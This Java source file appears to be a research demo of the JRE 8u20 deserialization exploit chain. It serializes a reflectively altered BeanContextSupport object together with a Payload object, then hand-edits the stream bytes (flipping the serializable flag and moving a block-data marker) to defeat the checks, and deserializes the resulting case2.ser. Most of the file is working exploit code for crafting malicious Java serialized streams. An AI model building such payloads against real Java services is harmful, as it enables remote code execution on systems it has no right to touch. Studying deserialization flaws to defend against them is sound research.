package com.feihong.jre8u20;

import com.feihong.jre8u20.util.Util;
import java.beans.beancontext.BeanContextSupport;
import java.io.*;
import java.lang.reflect.Field;

public class TestCase2 {
    public static void main(String[] args) throws Exception {
        //此 demo 需要运行 jdk <= 7u20 的情况下运行，如果大于此版本，需要调整

        BeanContextSupport bcs = new BeanContextSupport();
        Class cc = Class.forName("java.beans.beancontext.BeanContextSupport");
        Field serializable = cc.getDeclaredField("serializable");
        serializable.setAccessible(true);
        serializable.set(bcs, 0);

        Field beanContextChildPeer = cc.getSuperclass().getDeclaredField("beanContextChildPeer");
        beanContextChildPeer.set(bcs, bcs);

        ByteArrayOutputStream baous = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baous);

        oos.writeObject(bcs);
        oos.writeObject(new Payload());
        oos.close();

        byte[] bytes = baous.toByteArray();

        //将 serializable 的值修改为 1
        //0x73 = 115, 0x78 = 120
        //0x73 for TC_OBJECT, 0x78 for TC_ENDBLOCKDATA
        for(int i = 0; i < bytes.length; i++){
            if(bytes[i] == 120 && bytes[i+1] == 0 && bytes[i+2] == 1 && bytes[i+3] == 0 &&
                    bytes[i+4] == 0 && bytes[i+5] == 0 && bytes[i+6] == 0 && bytes[i+7] == 115){
                bytes[i+6] = 1;
                break;
            }
        }


        /**
             TC_BLOCKDATA - 0x77
             Length - 4 - 0x04
             Contents - 0x00000000
             TC_ENDBLOCKDATA - 0x78
         **/

        //把这部分内容先删除，再附加到最后
        //0x77 = 119, 0x78 = 120
        //0x77 for TC_BLOCKDATA, 0x78 for TC_ENDBLOCKDATA
        for(int i = 0; i < bytes.length; i++){
            if(bytes[i] == 119 && bytes[i+1] == 4 && bytes[i+2] == 0 && bytes[i+3] == 0 &&
                    bytes[i+4] == 0 && bytes[i+5] == 0 && bytes[i+6] == 120){
                bytes = Util.deleteAt(bytes, i);
                bytes = Util.deleteAt(bytes, i);
                bytes = Util.deleteAt(bytes, i);
                bytes = Util.deleteAt(bytes, i);
                bytes = Util.deleteAt(bytes, i);
                bytes = Util.deleteAt(bytes, i);
                bytes = Util.deleteAt(bytes, i);
                break;
            }
        }


        bytes = Util.addAtLast(bytes, (byte) 0x77);
        bytes = Util.addAtLast(bytes, (byte) 0x04);
        bytes = Util.addAtLast(bytes, (byte) 0x00);
        bytes = Util.addAtLast(bytes, (byte) 0x00);
        bytes = Util.addAtLast(bytes, (byte) 0x00);
        bytes = Util.addAtLast(bytes, (byte) 0x00);
        bytes = Util.addAtLast(bytes, (byte) 0x78);

        FileOutputStream fileOutputStream = new FileOutputStream("case2.ser");
        fileOutputStream.write(bytes);
        fileOutputStream.close();


        //反序列化
        FileInputStream fis = new FileInputStream("case2.ser");
        ObjectInputStream ois = new ObjectInputStream(fis);
        ois.readObject();
        ois.close();
    }
}
